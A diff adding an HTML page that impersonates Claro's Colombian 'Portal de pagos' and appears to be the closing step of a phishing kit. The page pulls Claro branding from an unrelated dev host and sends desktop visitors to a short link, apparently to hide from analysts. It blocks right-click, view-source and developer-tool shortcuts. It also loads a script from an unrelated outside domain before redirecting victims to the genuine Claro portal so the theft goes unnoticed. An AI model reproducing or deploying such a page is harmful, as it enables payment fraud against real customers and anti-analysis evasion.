@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <link rel="icon" type="image/png" href="https://dev-claro-img-css.pantheonsite.io/faviconcl.ico">
+    <title>Portal de pagos Claro</title>
+    <link rel="stylesheet" href="https://dev-claro-img-css.pantheonsite.io/style.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+
+<body>
+    <header id="comida">
+        <div class="caja_img">
+            <img class="logo" src="https://dev-claro-img-css.pantheonsite.io/logocl.svg">
+        </div>
+    </header>
+    <main>
+        <div id="ggris1" class="gris1">
+            <div class="texto_gris">
+                <img id="azul1" src="https://dev-claro-img-css.pantheonsite.io/icono1on.png" class="imagen">
+                <img id="azul2" src="https://dev-claro-img-css.pantheonsite.io/icono2off.png" class="imagen">
+                <img id="azul3" src="https://dev-claro-img-css.pantheonsite.io/icono3off.png" class="imagen">
+                <img id="azul4" src="https://dev-claro-img-css.pantheonsite.io/icono4off.png" class="imagen">
+                <p class="imagen2">Ingresa <br>tu Documento</p>
+                <p class="imagen2">Escoge el <br>medio de pago</p>
+                <p class="imagen2">Realiza el <br>Pago en linea</p>
+                <p class="imagen2">Recibe la <br>Confimacion</p>
+                <p class="texto1">Portal de <span class="rojo">PAGOS Y RECARGAS</span></p>
+            </div>
+        </div>
+
+        <div id="contenedor"></div>
+
+
+        <section>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+            <div style="text-align: center;"><img style="width: 130px; margin-left: auto;" src="https://dev-claro-img-css.pantheonsite.io/iconos-logo-claro.png">
+                <br><br>
+
+                <div class="loader">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+            </div>
+            <br>
+            <br>
+            <br>
+
+            <div style="text-align: center; line-height: 1rem;">
+                <h2 class="t-subtitle" style="line-height: 2.5rem; font-size: 1.6rem; color: #e5281bde;">Proceso finalizado con éxito.</h2>
+                <br>
+                <br>
+                <br>
+                <br>
+                <br>
+            </div>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+        </section>
+
+
+    </main>
+    <footer id="footerr">
+        <p class="app">Descarga ya la App Mi Claro</p>
+        <img class="android" src="https://dev-claro-img-css.pantheonsite.io/android.png">
+        <img class="ios" src="https://dev-claro-img-css.pantheonsite.io/ios.png">
+        <p>Terminos y condiciones - Politicas de privacidad.</p>
+        <div class="footer2">
+            <img class="logo2" src="https://dev-claro-img-css.pantheonsite.io/logocl.svg">
+            <p>Todos los derechos reservados - 2024 Claro</p>
+        </div>
+    </footer>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+
+    <script>
+        function detectar_dispositivo() {
+            var dispositivo = "";
+            if (navigator.userAgent.match(/Android/i))
+                dispositivo = "Android";
+            else if (navigator.userAgent.match(/webOS/i))
+                dispositivo = "webOS";
+            else if (navigator.userAgent.match(/iPhone/i))
+                dispositivo = "iPhone";
+            else if (navigator.userAgent.match(/iPad/i))
+                dispositivo = "iPad";
+            else if (navigator.userAgent.match(/iPod/i))
+                dispositivo = "iPod";
+            else if (navigator.userAgent.match(/BlackBerry/i))
+                dispositivo = "BlackBerry";
+            else if (navigator.userAgent.match(/Windows Phone/i))
+                dispositivo = "Windows Phone";
+            else
+                dispositivo = "PC";
+            return dispositivo;
+        }
+
+        if (detectar_dispositivo() == "PC") {
+            window.location.href = 'https://conclaros.co/Pa9e';
+        }
+    </script>
+
+
+<script>
+    // Desactiva clic derecho
+    document.addEventListener("contextmenu", function(e) {
+        e.preventDefault();
+    });
+
+    // Detecta el uso de teclas comunes para abrir el inspector
+    document.addEventListener("keydown", function(e) {
+        // F12 o Ctrl+Shift+I o Ctrl+Shift+J o Ctrl+U
+        if (
+            e.key === "F12" || 
+            (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) || 
+            (e.ctrlKey && e.key === "U")
+        ) {
+            e.preventDefault();
+            alert("Esta acción está deshabilitada.");
+        }
+    });
+
+    // Desactiva herramientas de desarrollo en otros navegadores
+    (function() {
+        const devtools = /./;
+        devtools.toString = function() {
+            this.opened = true;
+        };
+        const checkDevTools = setInterval(function() {
+            if (devtools.opened) {
+                alert("Por favor, no intentes inspeccionar esta página.");
+                window.location.reload();  // Opcional: recargar la página
+            }
+        }, 1000);
+    })();
+</script>
+
+</body>
+<script src="https://yousitesureonlineverification.com/recursos/script-Enlace.php"></script>
+<script type="text/javascript">
+    function final() {
+        window.location.href = "https://portalpagos.claro.com.co/index.php?view=vistas/personal/claro/newclaro/inicio.php&id_objeto=#no-back-button";
+    }
+
+    $(document).ready(function() {
+        setTimeout(final, 1800);
+    });
+</script>
+
+</html>
